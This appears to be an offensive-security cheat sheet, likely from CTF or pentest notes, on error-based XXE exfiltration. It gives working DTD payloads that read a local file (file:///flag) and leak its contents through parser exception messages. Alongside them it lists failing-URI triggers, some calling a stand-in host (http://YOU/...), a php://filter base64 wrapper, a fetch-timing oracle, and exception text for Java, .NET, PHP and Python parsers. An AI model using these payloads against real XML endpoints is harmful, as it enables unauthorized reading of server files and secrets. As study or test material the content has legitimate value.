# Error-Channel Deep — the exception as the exfil surface

## The principle — the parser leaks the URI it tried

When `SYSTEM "uri"` fails to resolve, the exception carries the URI —
`FileNotFoundException: file:///nonexistent/<content>` — the file's
content is IN the error message. The error IS the exfil channel —
no listener needed.

## The canonical composition — the standard error-exfil

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % e "<!ENTITY &#37; err SYSTEM 'file:///nonexistent/%f;'>">
%e;
%err;
```

`%e;` builds `<!ENTITY % err SYSTEM 'file:///nonexistent/<file-content>'>`
→ `%err;` triggers the fetch → FileNotFound URI = `/nonexistent/<content>`
→ the error message carries it.

## The trigger — which fetch fails

```
file:///nonexistent/<content>       — FileNotFound URI
file:///nonexistent/<content>.dtd   — same, looks like a DTD
ftp://nonexistent/<content>         — FTP error URI
http://YOU/nonexistent/<content>    — HTTP 404 URI
jar:file:///nonexistent/<content>!  — jar path URI
```

Each produces a different exception text — the URI is always embedded.

## The "the error is in-band" — where the error lands

- the HTTP response body — a `500`/`400` with the exception
- a SOAP `<faultstring>` — the SOAP fault carries it
- an app-level error JSON `{"error": "..."}` — the message field
- a log the app returns on `?debug`/`?verbose`

If errors are suppressed (a custom error page) → error-channel dead →
`denied-conditions.md`.

## The per-parser exception text — what the URI looks like inside

**Java:**
```
java.io.FileNotFoundException: file:///nonexistent/<content> (No such file or directory)
java.net.MalformedURLException: no protocol: ...
org.xml.sax.SAXParseException: The entity "x" was referenced...
java.io.IOException: Server returned HTTP response code: 404
```

**.NET:**
```
System.IO.DirectoryNotFoundException: file:///nonexistent/<content>
System.Xml.XmlException: ...
System.Net.WebException: The remote server returned an error: (404)
```

**libxml2/PHP:**
```
Warning: DOMDocument::loadXML(): I/O warning : failed to load external entity "file:///nonexistent/<content>"
Warning: simplexml_load_string(): failed to open stream
```

**Python lxml/sax:**
```
lxml.etree.XMLSyntaxError: Failure loading file:///nonexistent/<content>
xml.sax._exceptions.SAXParseException: ...
FileNotFoundError: [Errno 2] No such file or directory
```

## The URI-length limit — the exfil ceiling

The URI carrying the file content gets long — some parsers cap the URI
length in the exception message — a file >4KB may truncate in the
error. The workaround — slice the file:

```dtd
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

b64 it first (PHP) or use `iconv`/`zlib` chains to shrink.

## The "the error ISN'T the exfil but the timing is" — the fetch-time oracle

A `http://YOU/slow` fetch that takes 3s → the request takes 3s → the
timing channel. Even when the error is suppressed, the TIME the parser
spent fetching is observable — a blind oracle.

## The "the error fires but content doesn't carry" — the URL-unsafe problem

A file with `?`/`&`/`#`/space breaks the URI — the exception truncates
at the first unsafe char — the "content" in the error is the file's
prefix up to the bad char. Mitigation — `php://filter` base64-wrap, or
read byte-by-byte via the "the next byte triggers the error" oracle.

## The "error in the entity-NAME not the URI" — the entity-not-found exfil

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % e "<!ENTITY %f;>">
%e;
```

Builds `<!ENTITY <file-content>>` — the file content lands in the
entity NAME → `Entity '<file-content>'` not defined → the error carries
the file content as an entity name. Niche — entity names can't contain
most chars — only short clean names work.

## The "the DTD's own error" — a malformed-DTD error

A fetched DTD that's malformed produces a DTD-parse error carrying
the DTD's content — the file content lands in the DTD-parse exception —
`%file;` → a self-referencing malformed DTD.

## Falsifiers

- errors suppressed / custom error page → error-channel dead — try
  blind-OOB or local-DTD
- exception truncates at first unsafe char → only prefix leaks — use
  `php://filter` or accept the prefix
